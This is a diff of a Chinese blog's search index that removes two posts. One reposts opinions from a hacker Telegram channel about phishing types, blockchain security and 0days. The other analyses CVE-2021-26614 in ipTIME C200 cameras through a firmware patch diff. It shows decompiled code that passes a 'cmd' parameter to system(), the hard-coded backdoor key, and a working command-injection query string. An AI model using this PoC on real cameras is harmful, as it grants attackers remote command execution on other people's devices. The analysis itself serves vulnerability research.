       </tags>
   </entry>
   <entry>
@@ -323,107 +475,6 @@
 ]]></content>
       <tags>
         <tag>OS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>灰袍推送Mark</title>
-    <url>/2021/10/02/%E7%81%B0%E8%A2%8D%E6%8E%A8%E9%80%81Mark/</url>
-    <content><![CDATA[<p>最近浏览了灰袍推送的tg频道，记录一些有意思的言论。灰袍推送中有些关于<strong>方法论</strong>、<strong>工程化</strong>、<strong>区块链</strong>的东西很有让人眼前一亮的感觉在此记录一下，方便以后查看。</p>
-<span id="more"></span>
-
-<h2 id="来自-灰袍推送"><a href="#来自-灰袍推送" class="headerlink" title="来自@灰袍推送"></a>来自@灰袍推送</h2><ol>
-<li><p>论黑客工程化是我们的追求。黑客工程化是我们的追求。黑客工程化的意思是：我们的所有技能需要成体系活动，能交给机器的都交给机器，我们控制机器“木偶们”来加速我们的效率。为了最优这个工程化，我们很明白什么技能是必须精通的，什么技能是够用就好，什么技能是拿来主义。</p>
-</li>
-<li><p>那个“安全技能树”圈子，新人太多，我一旦分享点复杂的，似乎都安静了。对于陌生的知识怎么办？先 mark，以后有机会再消化，没机会也无所谓，至少知道有这个就好。对于不陌生的，赶紧跟上实践。实战派，不废话。指的就是这个。</p>
-</li>
-<li><p>灰帽 C#，这本书很不错，玩 Win 渗透的，建议这本书实操完。</p>
-</li>
-<li><p>什么黑客技术是好技术？黑产或 APT 组织已经在实战的技术 。</p>
-</li>
-<li><p>很多人不明白什么是职业什么是业余，什么是兴趣什么是工作。举个例子，黑客攻防，是我兴趣，也是工作，更成为了职业。而玩玩比特币、打打王者荣耀、吃吃小龙虾虽也是兴趣，但很业余，我不会通过这种方式去赚钱，能赚到也是投机罢了，如果能成大事，那也是投机，命运选中了我而已。再往细了说，黑客攻防分支领域几十条，也仅某些条会是我的职业，而有不少仅仅是业余，如打 CTF、玩黑手等。</p>
-</li>
-<li><p>通读两本行业一流的书籍是最稳的入门进阶方式。</p>
-</li>
-<li><p>设计一个商业模式的快感大于设计一个软件工程，不过都小于挖到一个大 0day，因为大 0day 自带牛逼的商业模式😄。</p>
-</li>
-<li><p>那些老协议，没认证与加密设计的，都会出大问题，多个 S 多关键。<a href="https://rtpbleed.com/">https://rtpbleed.com</a></p>
-</li>
-<li><p>天天喊发干货的人，我就问你 Kali 的每个工具你都了解过没，哪怕绝大多数点开看看都没吧？都懒成这样，是懒还是蠢？</p>
-</li>
-<li><p>干货拿走，消化一年再说：<a href="https://github.com/coreb1t/awesome-pentest-cheat-sheets">https://github.com/coreb1t/awesome-pentest-cheat-sheets</a></p>
-</li>
-<li><p>钓鱼攻击类型我总结几类：普通域名钓鱼、双因素钓鱼、XSS 高级钓鱼、CSRF 高级钓鱼、浏览器扩展钓鱼、系统木马钓鱼、MITM 钓鱼。这些细节在我的硬盘里。</p>
-</li>
-<li><p>建议大家开始关注“区块链”技术，在自己的技能树上多一个这个是好事，至少可以很好避免成为投机者中的韭菜。玩安全的，可以探索这个领域的安全问题。</p>
-</li>
-<li><p>不小心连续发的都是区块链相关的观点。做安全就是这样，需要跟上时代。区块链安全里，我们会把其分为两大类：区块链本身的安全，区块链之上各类业务的安全。对于我们来说，区块链本身的安全是我们的技能短板，里面大量的安全问题是需要算法、架构、工程的整体思考。如果不能深入到区块链创造细节里去，这类的安全从何研究？</p>
-</li>
-<li><p>未来的世界是去中心化与中心化的博弈平衡，绝对不会有完美的去中心化生态，原因请自行阅读《自私的基因》…</p>
-</li>
-<li><p>安全研究第一步：<strong>目标攻击面</strong>都有哪些？第二步：<strong>攻击路径如何描绘</strong>出来？这两大步骤是最考验安全人员经验及想象力的地方。</p>
-</li>
-<li><p>区块链世界最伟大的点在于：通过技术信仰吸引一批信徒且都利益绑定了。</p>
-</li>
-<li><p>比特币网络新增两个杀手锏，一个是闪电网络，一个是 RSK。</p>
-</li>
-<li><p>《麻省理工科技评论》2018 年“全球十大突破性技术” ：<a href="http://mp.weixin.qq.com/s//_kdbSRdIwr4bIXfNtut8Fw%EF%BC%8C%E5%8C%BF%E5%90%8D%E8%B4%A7%E5%B8%81Zcash%E5%9C%A8%E5%8D%81%E5%A4%A7%E4%B9%8B%E4%B8%80%E9%87%8C%E8%A2%AB%E6%8F%90%E5%8F%8A%E3%80%82">http://mp.weixin.qq.com/s/\_kdbSRdIwr4bIXfNtut8Fw，匿名货币Zcash在十大之一里被提及。</a></p>
-</li>
-<li><p>看到 bettercap 从 Ruby 改为 Go，就等着 MSF 和 BeEF 了。黑客工程化的世界，要么 Python 要么 Go，其他都是小众，JavaScript 还差些火候。</p>
-</li>
-<li><p>Google 说了“您应始终使用 HTTPS 保护您的所有网站，即使这些网站并不处理敏感的通信。</p>
-</li>
-<li><p>你猜为什么？尤其是那些区块链世界的网站，即使上面没 Web 钱包，没交易所功能。</p>
-</li>
-<li><p>DNS Rebinding 技巧用于钱包节点 HTTP RPC 的攻击确实很猥琐，上古时代的技巧到现在还是这么的帅！</p>
-</li>
-<li><p>DNS这种设计一直是信息安全头顶的一朵乌云。</p>
-</li>
-</ol>
-<p><img src="/2021/10/02/%E7%81%B0%E8%A2%8D%E6%8E%A8%E9%80%81Mark/dns.jpg" alt="文本, 电子邮件  描述已自动生成"></p>
-<ol start="24">
-<li><p>当年门罗币背后的那些人设计出这个币种时有没有预见过，这个举动无意间让网络世界和平了不少:-)</p>
-</li>
-<li><p>一次漂亮的分享最大的利己是：极其加深自己对所分享知识的印象。</p>
-</li>
-<li><p>一个好漏洞从发现到 PoC 到 Exploit 到 Attack 到 Defense 到披露，可以完美打通一次任督二脉。这样的机会不多，多珍惜。</p>
-</li>
-<li><p>过了遍比特币生态网络里的 RSK 生态解决方案及相关源码，他们对安全有不错的理解，尤其是他们应该早有意识到以太坊生态安全缺陷，这点很赞。</p>
-</li>
-<li><p>以太坊智能合约的出现让软件工程师真的可以对得起工程师称号，多好的事。</p>
-</li>
-<li><p>创业最爽的是还能亲自带队攻克两个核心能力：1. 0day；2. 黑客工程。</p>
-</li>
-<li><p>玩前端黑只需掌握 Chrome DevTools 就好:-)</p>
-</li>
-<li><p>区块链本质根本不是什么去中心，而是利益共识。明白这点就行了。而我是游走在两个极端之间的人，我只知道这里存在很多安全攻防博弈。乱，浮，和你我无关，我们改变不了。</p>
-</li>
-<li><p>最快的成长方式就是实战中成长，比如你拿到攻击者的样本，立马可以吸收其手法精髓，防御上就可以有的放矢。再比如为了突破，你死磕到底，一回头会发现：卧槽，掌握了各种技巧，而这许多是死磕前绝无法想象到的。</p>
-</li>
-<li><p>创造比纯粹的 Hacking 更重要，但 Hacking 才能促进更独特的创造。</p>
-</li>
-<li><p>探索本质这是黑客必须具备的基本素质。</p>
-</li>
-<li><p>DApp 游戏本质是一场“代码即法律”的黑客游戏。</p>
-</li>
-<li><p>黑客的初阶是逆向思维，进阶则是正向思维。</p>
-</li>
-<li><p>区块链领域的黑客几乎都不是曾经的黑客，他们几乎都是很懂区块链的技术人员，且带了点逆向思维。曾经的黑客几乎都过时了，绝大多数没机会在这个新领域开天辟地，只能费劲地跟着。</p>
-</li>
-<li><p>5G 与 IoT 时代的风险与机遇：<a href="https://threatpost.com/the-danger-and-opportunity-in-5g-connectivity-and-iot/138493/">https://threatpost.com/the-danger-and-opportunity-in-5g-connectivity-and-iot/138493/</a> 如果 IPv6 也大量启用，那对网络空间测绘来说，是个新挑战🤔。</p>
-</li>
-<li><p>我说我们在做区块链安全，其实我们在做都是公链生态的安全，慢雾的机会仅在这，如果这个生态没了，慢雾也会沉静甚至消失。是的，所谓的联盟链、私链不是我们的机会，我们的机会在自由的网络空间里:-)</p>
-</li>
-<li><p><a href="https://mp.weixin.qq.com/s/s-gxfYsGUeosiRwpXoWN6w">https://mp.weixin.qq.com/s/s-gxfYsGUeosiRwpXoWN6w</a></p>
-</li>
-<li><p>维基解密新年推文里问：2019，你认为哪些被泄露的档案最能改变我们对人类文明的理解？… 要搞大事？</p>
-</li>
-</ol>
-<h2 id="来自-Ton-OKEx中文频道"><a href="#来自-Ton-OKEx中文频道" class="headerlink" title="来自@Ton&amp;OKEx中文频道"></a>来自@<strong>Ton&amp;OKEx中文频道</strong></h2><ol>
-<li>Ton区块链继承自Telegram，旨在为数十亿用户提供服务。它拥有超快的交易速度、低廉的费用和易于使用的原生应用程序，其中一些应用程序可以直接在Telegram中使用，如 @wallet 或 @cryptobot 。</li>
-</ol>
-]]></content>
-      <tags>
-        <tag>转载</tag>
       </tags>
   </entry>
   <entry>
@@ -801,57 +852,6 @@
 ]]></content>
       <tags>
         <tag>转载</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2021-26614 ipTIME摄像头RCE漏洞分析</title>
-    <url>/2024/07/29/CVE-2021-26614-ipTIME%E6%91%84%E5%83%8F%E5%A4%B4RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><blockquote>
-<p>□ Overview<br>o EFMNetworks Co.,Ltd released security update to address remote code execution vulnerability in IpTime C200 camara.<br>Vulnerability Type	Impact	Severity	CVSS Score	CVE ID<br>Exposed dangerous method<br>or function	remote code execution	High	7.5	CVE-2021-26614<br>□ Description<br>o ius_get.cgi in IpTime C200 camera allows remote code execution. A remote attacker may send a crafted parameters to the exposed vulnerable web service interface which invokes the arbitrary shell command.</p>
-<p>□ Affected Product<br>Product	Version	Platform<br>IpTime C200 Camera	1.058 or prior	Ubuntu 20.04</p>
-<p>□ Solution<br>o Update firmware over IpTime C200 Camera 1.060 version or higher.</p>
-<p>□ Reference<br>[1] <a href="http://iptime.com/iptime/?page_id=126&pageid=1&mod=&keyword=C200&uid=24015">http://iptime.com/iptime/?page_id=126&amp;pageid=1&amp;mod=&amp;keyword=C200&amp;uid=24015</a></p>
-<p>□ Acknowledgements<br>[1] Thanks to Inhyeong Yi and Jaehyeong Yi for reporting this vulnerability.</p>
-</blockquote>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该漏洞存在于版本<code>1.06</code>之前，并已发布版本，尝试进行补丁分析</p>
-<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>首先下载前后两个固件并解包</p>
-<ul>
-<li><a href="https://iptime.com/iptime/?pageid=2&page_id=126&keyword=C200&uid=24015&mod=document">https://iptime.com/iptime/?pageid=2&amp;page_id=126&amp;keyword=C200&amp;uid=24015&amp;mod=document</a></li>
-</ul>
-<p>没有加密，直接binwalk解包即可</p>
-<p>查找目标文件<code>iux_get.cgi</code></p>
-<p><img src="/2024/07/29/CVE-2021-26614-ipTIME%E6%91%84%E5%83%8F%E5%A4%B4RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240729151425537.png" alt="image-20240729151425537"></p>
-<p>对这两个<code>iux_get.cgi</code>进行diff对比</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[  3:18PM ]  [ c0r3dump@ArchLinux:/mnt/hgfs/shared_dir/diff_dir ]</span><br><span class="line"> $ <span class="built_in">ls</span> -lh ./</span><br><span class="line">total 171K</span><br><span class="line">-rwxrwxrwx 1 root root 86K Jul 29 15:16 iux_get_58.cgi</span><br><span class="line">-rwxrwxrwx 1 root root 86K Jul 29 15:18 iux_get_60.cgi</span><br><span class="line">[  3:18PM ]  [ c0r3dump@ArchLinux:/mnt/hgfs/shared_dir/diff_dir ]</span><br><span class="line"> $ <span class="built_in">cp</span> ../_c200_1_060.bin.extracted/squashfs-root/usr/www/cgi/iux_get.cgi ./iux_get_60.cgi</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>Bindiff</p>
-<ul>
-<li><a href="https://github.com/google/bindiff/releases">https://github.com/google/bindiff/releases</a></li>
-<li>指定IDA安装位置后使用</li>
-</ul>
-<p><img src="/2024/07/29/CVE-2021-26614-ipTIME%E6%91%84%E5%83%8F%E5%A4%B4RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240729155246852.png" alt="image-20240729155246852"></p>
-<p>只有一个<code>0x401B04</code>相似度偏差最大</p>
-<p><img src="/2024/07/29/CVE-2021-26614-ipTIME%E6%91%84%E5%83%8F%E5%A4%B4RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240729155711415.png" alt="image-20240729155711415"></p>
-<p>删除了此部分逻辑，进行查看</p>
-<p><img src="/2024/07/29/CVE-2021-26614-ipTIME%E6%91%84%E5%83%8F%E5%A4%B4RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240729155909989.png" alt="image-20240729155909989"></p>
-<p>具体定位到如下</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  v3 = (<span class="type">const</span> <span class="type">char</span> *)getenv(<span class="string">&quot;QUERY_STRING&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(v15, <span class="number">1024</span>, <span class="string">&quot;%s&quot;</span>, v3);</span><br><span class="line">  v4 = (<span class="type">const</span> <span class="type">char</span> *)sub_40C890(v15, <span class="string">&quot;tmenu&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(v17, <span class="number">32</span>, <span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  v5 = (<span class="type">const</span> <span class="type">char</span> *)sub_40C890(v15, <span class="string">&quot;smenu&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(v18, <span class="number">32</span>, <span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  v6 = (<span class="type">const</span> <span class="type">char</span> *)sub_40C890(v15, <span class="string">&quot;act&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(v19, <span class="number">32</span>, <span class="string">&quot;%s&quot;</span>, v6);  </span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;cam&quot;</span>, v17) &amp;&amp; !<span class="built_in">strcmp</span>(<span class="string">&quot;debug&quot;</span>, v18) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_409748((<span class="type">int</span>)v15);</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>从请求的变量中获取参数</li>
-<li><code>tmenu=cam &amp;&amp; smenu=debug</code></li>
-<li>sub_409748</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_409748</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// $t8</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="type">int</span> cmdString; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+28h] [+28h]</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">512</span>]; <span class="comment">// [sp+2Ch] [+2Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">4100</span>]; <span class="comment">// [sp+22Ch] [+22Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5 = sub_40C890(a1, (<span class="type">int</span>)<span class="string">&quot;act&quot;</span>);              <span class="comment">// 返回act参数对应的值，即atc=value,返回value</span></span><br><span class="line">  <span class="keyword">if</span> ( !v5 || <span class="built_in">strcmp</span>(v5, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v8 = sub_40C890(a1, (<span class="type">int</span>)<span class="string">&quot;aaksjdkfj&quot;</span>);        <span class="comment">// 返回aaksjdkfj参数对应的value</span></span><br><span class="line">  <span class="keyword">if</span> ( !v8 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)v8 == <span class="string">&#x27;1&#x27;</span>                      <span class="comment">// value: 11dnjsrurelqjrm22</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">1</span>) == <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">2</span>) == <span class="string">&#x27;d&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">3</span>) == <span class="string">&#x27;n&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">4</span>) == <span class="string">&#x27;j&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">5</span>) == <span class="string">&#x27;s&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">6</span>) == <span class="string">&#x27;r&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">7</span>) == <span class="string">&#x27;u&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">8</span>) == <span class="string">&#x27;r&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">9</span>) == <span class="string">&#x27;e&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">10</span>) == <span class="string">&#x27;l&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">11</span>) == <span class="string">&#x27;q&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">12</span>) == <span class="string">&#x27;j&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">13</span>) == <span class="string">&#x27;r&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">14</span>) == <span class="string">&#x27;m&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">15</span>) == <span class="string">&#x27;2&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">16</span>) == <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;html&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;center&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;form method=get action=\&quot;iux_get.cgi\&quot; name=\&quot;dform\&quot;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&lt;input type=hidden name=tmenu value=\&quot;cam\&quot;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&lt;input type=hidden name=smenu value=\&quot;debug\&quot;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&lt;input type=hidden name=act value=1&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;File Name : &lt;input type=text name=\&quot;fname\&quot; value=\&quot;\&quot; size=50 maxlength=120&gt;&lt;br&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Command Name : &lt;input type=text name=\&quot;cmd\&quot; value=\&quot;\&quot; size=64 maxlength=256&gt;&lt;br&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&lt;input type=text name=\&quot;aaksjdkfj\&quot; value=\&quot;%s\&quot; size=64 maxlength=256&gt;&lt;br&gt;&lt;br&gt;\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v8);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;input type=submit name=\&quot;dapply\&quot; value=\&quot; Show \&quot;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;/form&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;/center&gt;&lt;br&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">    v6 = sub_40C890(a1, (<span class="type">int</span>)<span class="string">&quot;act&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &amp;&amp; !<span class="built_in">strcmp</span>(v6, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = sub_40C890(a1, (<span class="type">int</span>)<span class="string">&quot;fname&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = fopen(v9, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( fgets(v10, <span class="number">256</span>, v3) )</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;&lt;font size=-1&gt;%s&lt;/font&gt;&lt;br&gt;\n&quot;</span>, v10);</span><br><span class="line">          fclose(v3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;file open error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cmdString = sub_40C890(a1, (<span class="type">int</span>)<span class="string">&quot;cmd&quot;</span>);   <span class="comment">// 获取cmd参数的value</span></span><br><span class="line">      <span class="keyword">if</span> ( cmdString )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_409660(cmdString, v11);             <span class="comment">// 将其拷贝到v11</span></span><br><span class="line">        <span class="built_in">snprintf</span>(v10, <span class="number">512</span>, <span class="string">&quot;%s &gt;&gt; /var/run/cmd_temp&quot;</span>, v11);<span class="comment">// inject,例如 ls /; id</span></span><br><span class="line">        system(v10);</span><br><span class="line">        v4 = fopen(<span class="string">&quot;/var/run/cmd_temp&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>综上分析，即可知poc如下, 即可命令注入</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;tmenu=cam&amp;smenu=debug&amp;act=1&amp;aaksjdkfj=11dnjsrurelqjrm22&amp;cmd=<span class="built_in">whoami</span>;<span class="built_in">id</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://web.archive.org/web/20211209121323/https://www.boho.or.kr/krcert/secNoticeView.do?bulletin_writing_sequence=36346">https://web.archive.org/web/20211209121323/https://www.boho.or.kr/krcert/secNoticeView.do?bulletin_writing_sequence=36346</a></p>
-<p><a href="https://www.iotsec-zone.com/article/135">https://www.iotsec-zone.com/article/135</a></p>
-]]></content>
-      <tags>
-        <tag>IoT</tag>
       </tags>
   </entry>
 </search>
